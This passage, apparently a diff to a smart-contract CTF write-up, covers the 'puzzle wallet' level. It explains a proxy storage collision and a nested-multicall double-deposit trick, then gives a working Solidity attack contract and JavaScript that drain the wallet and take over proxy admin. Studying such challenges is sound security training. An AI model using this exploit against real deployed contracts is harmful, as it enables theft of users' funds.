@@ -693,5 +693,52 @@ tx = await dex.swap(dummyToken.address, token1.address, 20);
 await tx.wait()
 ```
 
+--- 
+
+## puzzle wallet
+
+The goal is to become the proxy admin.  `PuzzleProxy` has `proposeNewAdmin` function public without any checks. We can become `pendingAdmin` via this, but how does it help us. Recall that delegate function executes logic of another contract in the context of the proxy contract. By setting `pendingAdmin` as the player's address, we can access owner role in the `PuzzleWallet`
+
+Which gives access to `addToWhitelist`. Call `addToWhitelist` via delegate from Proxy contractand add player as whitelisted address. Now we can call `setMaxBalance` but there is a requirement of balance to be zero.
+
+Balance can only be drained from `execute` which requires sender to deposit some funds. We need to trick the contract into mapping more balance to player's address than it actually is and drain all the funds. `deposit` is pretty striaghtforward. `multicall` is the only one left. We can call `deplosit` twice via multicall even though it has a check, of `require(!depositCalled, "Deposit can only be called once");` via wrapping our second deposit call inside a multicall.
+
+Then we simply drain the funds and call `setMaxBalance` with value set to player's address (with a slight bit manipulation)
+
+
+```solidity
+contract WalletAttack {
+    PuzzleProxy proxy;
+    PuzzleWallet wallet;
+    constructor(address instance) payable {
+        proxy = PuzzleProxy(payable(instance));
+        wallet = PuzzleWallet(instance);
+
+        proxy.proposeNewAdmin(address(this));
+        wallet.addToWhitelist(address(this));
+        
+        bytes[] memory data = new bytes[](2);
+        data[0] = abi.encodeWithSignature("deposit()");
+
+        bytes[] memory nestedDeposit = new bytes[](1);
+        nestedDeposit[0] = abi.encodeWithSignature("deposit()");
+
+        data[1] = abi.encodeWithSignature("multicall(bytes[])", nestedDeposit);
+        wallet.multicall{value: 0.001 ether}(data);
+        wallet.execute(address(this), 0.002 ether, "");
+        uint256 maxBalance = uint256(bytes32(bytes20(address(msg.sender))) >> 96);
+        wallet.setMaxBalance(maxBalance);
+        
+    }
+    receive() payable external {}
+}
+```
+
+```javascript
+const attack = await WalletAttack.deploy(INSTANCE_ADDRESS, {value: ethers.utils.parseEther("0.001")})
+await attack.deployed();
+console.log(await proxy.admin());
+```
+
 
 
